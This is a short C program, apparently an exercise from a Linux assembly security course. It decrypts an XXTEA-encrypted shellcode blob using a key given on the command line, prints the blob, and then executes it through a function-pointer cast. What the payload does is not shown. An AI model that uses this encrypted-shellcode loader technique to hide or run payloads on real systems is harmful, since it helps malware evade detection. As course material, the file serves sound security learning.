/** Decrypts encrypted shellcode via XXTEA algorithm.
 * \brief 
 * \details This was created as part of the SecurityTube Linux Assembly Expert
 * course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 * \author Travis Mathison
 * \copyright
 *
 * The MIT License (MIT)
 * 
 * Copyright (c) 2018 Travis Mathison
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#include <stdio.h>
#include <string.h>
#include "xxtea.h"

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("%s\n", "usage: ./decrypt <key>");
        exit(1);
    }

    unsigned char encrypted_data[] = "\x5b\x69\x1c\xed\x22\x51\x2c\xcc\x53\x92\x18\xa4\xed\x12\x31\xb2\x86\xe0\x05\xfe\x96\xd5\x71\xd5\x7e\x5b\xd6\x10\x2f\xe9\xf5\x9e";
    size_t encrypted_data_len = strlen((const char *) encrypted_data);
    const char *key = argv[1];

    printf("%s\n", "Shellcode before decryption:");
    for (int counter = 0; counter < encrypted_data_len; ++counter) {
        printf("\\x%02x", encrypted_data[counter]);
    }

    size_t len;
    unsigned char *decrypted_data = xxtea_decrypt(encrypted_data, encrypted_data_len, key, &len);

    printf("\n\nDecrypted shellcode:\n");
    for (size_t counter = 0; counter < strlen(decrypted_data); counter += 2) {
        printf("\\x%02x\\x%02x", (int)decrypted_data[counter], (int)decrypted_data[counter+1]);
    }

    printf("\n\nExecuting shellcode.");

    int (*ret)() = (int(*)())decrypted_data;
    ret();

    return 0;
}

